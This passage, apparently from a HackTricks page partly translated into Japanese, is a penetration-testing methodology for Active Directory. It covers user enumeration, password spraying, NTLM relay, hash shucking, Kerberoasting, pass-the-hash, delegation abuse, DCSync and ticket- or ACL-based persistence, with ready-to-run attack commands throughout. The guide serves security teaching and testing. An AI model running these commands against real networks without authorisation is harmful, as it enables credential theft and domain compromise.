# Active Directory 方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤技術として機能し、**network administrators** がネットワーク内で **domains**、**users**、および **objects** を効率的に作成・管理できるようにします。大規模にスケールするよう設計されており、多数のユーザーを管理しやすい **groups** や **subgroups** に整理し、さまざまなレベルで **access rights** を制御できます。

**Active Directory** の構造は主に 3 つの層で構成されます：**domains**、**trees**、および **forests**。**domain** は共通のデータベースを共有する **users** や **devices** といったオブジェクトの集合を含みます。**trees** は共通の構造で結びついたこれらのドメインのグループで、**forest** は複数の trees を **trust relationships** によって結合したもので、組織構造の最上位を形成します。各レベルで特定の **access** や **communication rights** を指定できます。

**Active Directory** の主要な概念には以下があります：

1. **Directory** – Active Directory オブジェクトに関する全情報を格納します。
2. **Object** – ディレクトリ内の実体を示し、**users**、**groups**、または **shared folders** などが含まれます。
3. **Domain** – ディレクトリオブジェクトのコンテナとして機能し、複数のドメインが **forest** 内で共存でき、それぞれ独自のオブジェクト集合を保持します。
4. **Tree** – 共通のルートドメインを共有するドメイン群の集合です。
5. **Forest** – Active Directory の組織構造の頂点で、複数の tree が **trust relationships** を介して構成されています。

**Active Directory Domain Services (AD DS)** は、ネットワーク内での集中管理と通信に不可欠な一連のサービスを含みます。これらのサービスは次のとおりです：

1. **Domain Services** – データの集中格納を行い、**users** と **domains** 間のやり取り（**authentication** や **search** 機能を含む）を管理します。
2. **Certificate Services** – セキュアな **digital certificates** の作成、配布、管理を行います。
3. **Lightweight Directory Services** – **LDAP protocol** を介してディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数の Web アプリ間での **single-sign-on** を提供します。
5. **Rights Management** – 著作権保護資料の不正配布や使用を制御するのに役立ちます。
6. **DNS Service** – **domain names** の解決に不可欠です。

詳細は以下を参照してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 認証**

AD を攻撃する方法を学ぶには、**Kerberos authentication process** を非常によく理解する必要があります。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## チートシート

AD を列挙/悪用するために実行できるコマンドを素早く確認するには、[https://wadcoms.github.io/](https://wadcoms.github.io) を参照してください。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

AD 環境にアクセスはあるがクレデンシャル/セッションがない場合、以下のような手段が考えられます：

- **Pentest the network:**
- ネットワークをスキャンしてマシンや開いているポートを見つけ、既知の **vulnerabilities** を **exploit** したり、そこから **extract credentials** を試みます（例: [printers could be very interesting targets](ad-information-in-printers.md)）。
- DNS を列挙すると、web、printers、shares、vpn、media などドメイン内の重要サーバに関する情報が得られることがあります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- この作業の詳細は一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバ列挙の詳細ガイドは以下を参照してください：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP の列挙方法の詳細ガイドは以下を参照してください（**anonymous access** に特に注意してください）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder を使って **impersonating services** により資格情報を収集する（詳細は {#ref} ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md {#endref} を参照）
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) でホストにアクセスする
- **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) により資格情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 内部文書、ソーシャルメディア、（主にドメイン内の）サービスや公開情報からユーザー名や氏名を抽出します。
- 会社の従業員のフルネームが判明した場合、さまざまな AD **username conventions** を試すことができます（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/) を参照）。一般的な規則には _NameSurname_、_Name.Surname_、_NamSur_（各 3 文字ずつ）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 文字ランダム＋3 数字ランダム（例: abc123）などがあります。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: 無効なユーザー名が要求されると、サーバは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、そのユーザー名が無効であることを判別できます。**Valid usernames** は **TGT in a AS-REP** 応答を返すか、事前認証が必要であることを示すエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ を返します。
- **No Authentication against MS-NRPC**: domain controllers 上の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1（認証なし）でアクセスします。この方法は MS-NRPC インターフェースにバインドした後に `DsrGetDcNameEx2` 関数を呼び出して、資格情報なしでユーザーまたはコンピュータの存在を確認します。NauthNRPC ツールはこの種の列挙を実装しています。研究はここにあります: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバのいずれかを見つけた場合、**user enumeration against it**を実行することもできます。例えば、ツール[**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> ただし、事前に実施した recon ステップで得た、**会社で働いている人の名前**を把握しているべきです。名前と姓が分かっていれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って、有効なユーザー名の候補を生成できます。

### Knowing one or several usernames

では、有効な username は分かっているが password が分からない場合... 次を試してください:

- [**ASREPRoast**](asreproast.md): ユーザが _DONT_REQ_PREAUTH_ 属性を**持っていない**場合、そのユーザに対して **AS_REP message** を**request**でき、ユーザのパスワードから派生した鍵で暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザに対して最も **common passwords** を試してみましょう。悪いパスワードを使っているユーザがいるかもしれません（password policy を考慮してください）。
- OWA サーバを **spray** してユーザのメールサーバへのアクセスを試みることも可能です。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

一部のプロトコルを**poisoning**することで、クラック用のチャレンジ**hashes**を**obtain**できる場合があります（**network**）:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

もし active directory の列挙に成功していれば、**more emails and a better understanding of the network** が得られるはずです。NTLM を強制して [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を仕掛け、AD env にアクセスできる可能性があります。

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 署名によって **SMB relay to the DC is blocked** 場合でも、**LDAP** の姿勢を引き続きプローブしてください: `netexec ldap <dc>` は `(signing:None)` / 弱いチャネルバインディングを示します。SMB signing が要求され LDAP signing が無効な DC は、**relay-to-LDAP** のターゲットとして **SPN-less RBCD** のような悪用に対して依然として有効です。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs は時折 **embed masked admin passwords in HTML**。ソース表示や devtools で確認すると cleartext が露出することがあり（例: `<input value="<password>">`）、これにより Basic-auth で scan/print repositories へのアクセスが可能になります。
- 取得した印刷ジョブにはユーザーごとのパスワードを含む **plaintext onboarding docs** が含まれている場合があります。テスト時はペアリングが一致していることを確認してください：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

active directory を列挙できていれば、**より多くのメール情報とネットワークの理解**を得られます。NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**を強制できる可能性があります。**

### コンピュータ共有でCredsを探す | SMB Shares

基本的な credentials を入手したら、**AD 内で共有されている興味深いファイルを見つけられるか**確認してください。手動で探すこともできますが、とても退屈で反復的な作業です（チェックすべきドキュメントが数百ある場合は特に）。

[**使用できるツールについてはこのリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

他の PC や shares に **access** できるなら、SCF file のようなファイルを **place** しておき、誰かがそれにアクセスした際にあなたに対して **NTLM authentication をトリガーさせ**、**NTLM challenge** を **steal** してクラックすることができます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みユーザーであれば誰でも **compromise the domain controller** することが可能でした。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory 上での権限昇格（privileged credentials/session がある場合）

**以下のテクニックを実行するには通常の domain user では不十分で、特定の privileges/credentials が必要です。**

### Hash extraction

うまくいけば [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relaying を含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[escalating privileges locally](../windows-local-privilege-escalation/index.html) などを使って **compromise some local admin** アカウントを取得しているでしょう。\
次に、メモリやローカルからすべての hashes をダンプする時です。\
[**ハッシュを取得するさまざまな方法についてはこのページを読んでください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーの hash を入手すれば**、それを使ってそのユーザーを **impersonate** できます。\
その hash を使って **NTLM authentication を実行する**ツールを使うか、あるいは新しい **sessionlogon** を作成してその **hash** を **LSASS** に **inject** し、以降の **NTLM authentication** でその **hash が使われる**ようにすることもできます。後者は mimikatz が行う方法です。\
[**詳細はこのページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃は、一般的な NTLM 上の Pass The Hash の代替として、**ユーザーの NTLM hash を使って Kerberos チケットを要求する**ことを目的としています。したがって、NTLM プロトコルが無効化され、認証に Kerberos のみが許可されているネットワークでは特に **有用** です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 攻撃手法では、攻撃者はパスワードやハッシュの代わりにユーザーの認証チケットを **盗み**、その盗んだチケットを使ってユーザーを **impersonate** し、ネットワーク内のリソースやサービスへ不正にアクセスします。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

もし **local administrator** の **hash** や **password** を持っているなら、それを使って他の **PCs** に **login locally** できるか試してください。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり**ノイズが多く**、**LAPS**で**軽減**できることに注意してください。

### MSSQL Abuse & Trusted Links

ユーザが**MSSQL インスタンスへアクセスする権限**を持っている場合、MSSQL ホスト上で（SA として動作していれば）**コマンドを実行**したり、NetNTLM **ハッシュを盗む**、あるいは**relay attack**を実行したりすることが可能です。\
また、ある MSSQL インスタンスが別の MSSQL インスタンスを信頼（database link）している場合、もしユーザが信頼されたデータベース上で権限を持っていれば、**その信頼関係を利用して他のインスタンス上でもクエリを実行できる**可能性があります。これらの信頼は連鎖でき、最終的にコマンドを実行できるような誤設定されたデータベースを見つけることがあり得ます。\
**データベース間のリンクはフォレスト間のトラストを越えても動作します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

サードパーティのインベントリやデプロイメントスイートは、資格情報やコード実行への強力な経路を露出することがよくあります。参照:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) を持つ Computer オブジェクトを見つけ、かつそのコンピュータ上でドメイン権限を持っている場合、当該コンピュータにログオンするすべてのユーザのメモリから TGT をダンプできるようになります。\
したがって、**Domain Admin がそのコンピュータにログオンした場合**、その TGT をダンプして [Pass the Ticket](pass-the-ticket.md) を使ってその Domain Admin を偽装することが可能です。\
constrained delegation によって、**自動的に Print Server を侵害**できる場合もあります（運が良ければその Print Server が DC であることもあります）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザまたはコンピュータが "Constrained Delegation" の対象になっている場合、そのユーザ/コンピュータは**特定のコンピュータ上のサービスに対して任意のユーザを偽装してアクセスできる**ようになります。\
そして、もしこのユーザ/コンピュータの**ハッシュを奪取**できれば、（Domain Admin を含む）**任意のユーザを偽装**して該当サービスにアクセスすることが可能になります。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートのコンピュータの Active Directory オブジェクトに対して **WRITE** 権限を持つことは、**昇格した権限でのコード実行**を可能にします:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

侵害したユーザが一部のドメインオブジェクトに対して**興味深い権限**を持っている場合、それにより横移動や**権限昇格**が可能になることがあります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

ドメイン内で**Spool サービスがリッスンしている**ことを発見した場合、それを**悪用**して**新しい資格情報を取得**したり、**権限を昇格**したりすることができます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**他のユーザ**が**侵害された**マシンに**アクセス**した場合、メモリから資格情報を**収集**したり、そのプロセスにビーコンを**インジェクト**して偽装することが可能です。\
通常、ユーザは RDP を通じてシステムにアクセスするため、サードパーティの RDP セッションに対するいくつかの攻撃方法は次のとおりです:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は、ドメイン参加したコンピュータの**ローカル Administrator パスワード**を管理するシステムで、パスワードを**ランダム化**し、ユニークにし、頻繁に**変更**することを保証します。これらのパスワードは Active Directory に保存され、アクセスは ACL によって認可されたユーザに制御されます。これらのパスワードへ十分な権限でアクセスできれば、他のコンピュータへピボットすることが可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

侵害したマシンから**証明書を収集**することは、環境内での権限昇格の手段になり得ます:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**脆弱なテンプレート**が設定されている場合、それを悪用して権限昇格することが可能です:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦 **Domain Admin**、あるいはさらに **Enterprise Admin** 権限を取得すると、ドメインデータベースである _ntds.dit_ を**ダンプ**することができます。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述したいくつかのテクニックは、永続化にも利用できます。\
例えば、次のようなことが可能です:

- ユーザを [**Kerberoast**](kerberoast.md) の対象にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- ユーザを [**ASREPRoast**](asreproast.md) の対象にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- ユーザに [**DCSync**](#dcsync) 権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、特定のサービス用に正当な Ticket Granting Service (TGS) チケットを、（例えば PC アカウントの）**NTLM ハッシュ**を使って作成する攻撃手法です。これはサービス権限へアクセスするために使われます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** は、Active Directory 環境で **krbtgt アカウントの NTLM ハッシュ**を攻撃者が取得することを伴います。このアカウントはすべての Ticket Granting Ticket (TGT) に署名するために使われ、AD ネットワーク内での認証に不可欠です。

攻撃者がこのハッシュを取得すると、任意のアカウント向けに **TGT を作成**できるようになります（Silver ticket attack と同様の利用が可能です）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは一般的な golden ticket 検知メカニズムを**回避するように作られた** golden ticket に似たチケットです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**アカウントの証明書を持つ、またはそれを要求できる**ことは、そのユーザアカウントに永続化する非常に有効な手段です（パスワードを変更されても有効）:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**証明書を使用して、ドメイン内で高権限を持ったまま永続化**することも可能です:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** オブジェクトは、Domain Admins や Enterprise Admins のような**特権グループ**のセキュリティを確保するために、これらのグループに対して標準化された **ACL** を適用します。これにより不正な変更を防止します。ただし、この機能は悪用可能であり、攻撃者が AdminSDHolder の ACL を変更して通常ユーザにフルアクセスを与えると、そのユーザはすべての特権グループに対して広範な制御を得ることになります。この保護機構は、緊密に監視されていない場合には裏目に出る可能性があります。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** にはローカル管理者アカウントが存在します。そのようなマシンで管理者権限を取得すれば、mimikatz を使ってローカル Administrator のハッシュを抽出できます。その後レジストリの変更を行い、このパスワードの使用を**有効化**することで、ローカル Administrator アカウントへリモートでアクセスできるようになります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

将来的にユーザが**権限昇格**できるよう、特定のドメインオブジェクトに対してそのユーザに**特別な権限**を与えることができます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

